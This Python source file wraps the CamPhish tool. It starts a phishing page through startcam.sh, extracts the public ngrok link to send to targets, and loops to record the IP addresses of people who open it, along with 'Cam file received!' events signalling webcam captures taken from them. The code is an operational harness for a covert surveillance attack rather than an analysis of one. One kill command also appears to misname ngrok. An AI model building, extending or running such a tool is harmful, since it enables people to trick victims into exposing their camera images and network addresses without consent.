import configparser
import shlex
import subprocess
import threading

import pexpect
import platform
import sys
import re
from pexpect import spawn

global cstm_data
global camphish_proc


class Output:
    def __init__(self, link: str = None, connections=None):
        if connections is None:
            connections = list( )
        self.link = link
        self.connections = connections
        self.old_connections = list( )


class custom_thread(threading.Thread):
    def __init__(self, target, args=None, daemon=False):
        if args is None:
            args = []
        super( ).__init__(target=target, args=args, daemon=daemon)
        self._is_running = True

    def stop(self):
        self._is_running = False
        camphish_proc.terminate(force=True)
        subprocess.run(['killall', 'nrok'], capture_output=True, text=True)
        output.link = None

    def run(self) -> None:
        while self._is_running:
            super( ).run( )


output = Output( )


def camphish(template: int, autthoken: str) -> str:
    global output
    global camphish_proc
    """
    :param service: int
    :param template: int
    :param autthoken: str
    :return: ngrok_link
    """

    config = configparser.ConfigParser( )
    config.read('app.cfg')
    if platform.system( ) == 'Linux':

        camphish_proc = pexpect.spawn(f'bash  startcam.sh 1 {template}')
        camphish_proc.timeout = int(config['RUNTIME']['TIMEOUT'])

        compiled_ngrok_url = re.compile(r"https://[\w-]*\.ngrok\.io")
        camphish_proc.expect(compiled_ngrok_url.pattern)

        data = camphish_proc.before
        data = data.decode('utf-8')

        link = re.findall(compiled_ngrok_url.pattern, data)

        if not link:
            test = subprocess.run(['./get_ip.sh'], capture_output=True, text=True)
            link = test.stdout
            output.link = link
        pattern = re.compile('\\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\\b')
        while True:
            camphish_proc.expect([pattern.pattern, 'Cam file received!'])
            ip = camphish_proc.after.decode('utf-8')
            output.connections.append(ip)


    elif platform.system( ) == 'Windows':
        print('WINDOWS DETECTED')
        return 'Windows support not implemented yet.'
    # todo maybe implement Windows support to run supproccesses with interactive answers
    elif platform.system( ) == 'Darwin':
        print('MacOS(DARWIN) DETECTED')
        return 'MacOS support not implemented yet.'
        # todo maybe implement MacOS support to run supproccesses with interactive answers

#     class TextIOTrap:
#         name = None
#         buffer = None
#         encoding = None
#         errors = None
#         newlines = None
#         line_buffering = None
#
#         def __init__(self, **args):
#             self.write_handler = args.get('write_handler', None)
#             self.name = args.get('name', '-')
#
#         def __iter__(self):
#             return []
#
#         def close(self):
#             pass
#
#         def detach(self):
#             pass
#
#         def fileno(self):
#             return 0
#
#         def flush(self):
#             pass
#
#         def isatty(self):
#             return False
#
#         def read(self, n=None):
#             return ''
#
#         def readable(self):
#             return False
#
#         def readline(self, limit=-1):
#             pass
#
#         def readlines(self, hint=-1):
#             return []
#
#         def seek(self, offset, whence=0):
#             pass
#
#         def seekable(self):
#             return False
#
#         def tell(self):
#             return 0
#
#         def truncate(self, size=None):
#             pass
#
#         def writable(self):
#             return True
#
#         def write(self, s):
#             if self.write_handler and not s == '\n':
#                 self.write_handler(s)
#             return 0
#
#         def writelines(self, lines):
#             if isinstance(lines, list):
#                 for s in lines: self.write(s)
